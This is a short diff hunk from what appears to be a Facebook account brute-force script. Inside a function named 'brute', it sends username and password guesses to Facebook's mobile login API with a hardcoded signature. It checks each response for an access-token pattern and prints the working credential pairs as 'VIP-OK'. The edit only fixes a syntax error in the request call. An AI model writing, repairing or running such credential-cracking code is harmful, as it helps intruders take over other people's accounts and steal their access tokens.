@@ -429,7 +429,7 @@ def brute(user, passs):
         'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
       }
       api='https://b-api.facebook.com/method/auth.login'
-      response=requests.get(api, params=params headers=headers)
+      response=requests.get(api, params=params)
       if re.search('(EAAA)\w+', str(response.text)):
         print('\x1b[0;32m[\x1b[0;37mVIP-OK\x1b[0;32m] %s • %s '%(str(user), str(pw)))
         break
